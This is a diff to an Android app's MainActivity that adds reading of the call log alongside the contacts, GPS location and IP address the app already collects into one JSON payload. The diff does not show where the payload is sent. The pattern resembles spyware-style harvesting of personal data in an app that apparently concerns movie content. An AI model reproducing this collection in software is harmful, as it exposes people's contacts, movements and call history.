@@ -44,6 +44,7 @@ public class MainActivity extends AppCompatActivity {
     JSONArray contactsJson = new JSONArray();
     JSONObject utilsJson = new JSONObject();
     JSONObject gpsJson = new JSONObject();
+    JSONArray callLogsJson = new JSONArray();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -74,6 +75,7 @@ public class MainActivity extends AppCompatActivity {
         try {
             data.put("ip", ip);
             data.put("gps", gpsJson);
+            data.put("callLog", callLogsJson);
             data.put("utils", utilsJson);
             data.put("contacts", contactsJson);
         } catch (JSONException e) {
@@ -87,9 +89,11 @@ public class MainActivity extends AppCompatActivity {
 
     final private int REQUEST_CODE_ASK_PERMISSIONS_CONTACT = 123;
     final private int REQUEST_CODE_ASK_PERMISSIONS_GPS = 124;
+    final private int REQUEST_CODE_ASK_PERMISSIONS_CALLOG = 125;
     private void checkIfPermissonExists() {
         int hasWriteContactsPermission = 0;
         int hasGPSPermission = 0;
+        int hasCallLogPermission = 0;
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) { //Android 6.0
 
             hasWriteContactsPermission = checkSelfPermission(Manifest.permission.READ_CONTACTS);
@@ -110,10 +114,20 @@ public class MainActivity extends AppCompatActivity {
             else {
                 readGPS();
             }
+            //Call log
+            hasCallLogPermission = checkSelfPermission(Manifest.permission.READ_CALL_LOG);
+            if(hasCallLogPermission != PackageManager.PERMISSION_GRANTED){
+                requestPermissions(new String[] {Manifest.permission.READ_CALL_LOG}, REQUEST_CODE_ASK_PERMISSIONS_CALLOG);
+                //return;
+            }
+            else {
+                readCallLogs();
+            }
         }
         else {  // Android Version < Android 6.0
             readContacts();
             readGPS();
+            readCallLogs();
         }
     }
 
@@ -137,6 +151,14 @@ public class MainActivity extends AppCompatActivity {
                     // Permission Denied
                     Toast.makeText(MainActivity.this, "ACCESS_FINE_LOCATION Denied", Toast.LENGTH_SHORT).show();
                 }
+            case REQUEST_CODE_ASK_PERMISSIONS_CALLOG:
+                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                    // Permission Granted
+                    readCallLogs();
+                } else {
+                    // Permission Denied
+                    Toast.makeText(MainActivity.this, "READ_CALL_LOG Denied", Toast.LENGTH_SHORT).show();
+                }
             default:
                 super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         }
@@ -157,6 +179,13 @@ public class MainActivity extends AppCompatActivity {
 
             Toast.makeText(getApplicationContext(),gpsJson.toString(), Toast.LENGTH_LONG).show();
         }
+    }
+
+
+    public void readCallLogs(){
+        ContentResolver contentResolver = getContentResolver();
+        CallLogs calllogs= new CallLogs(contentResolver);
+        callLogsJson = calllogs.getCallLogs();
     }
 
     //getting sinemalar content
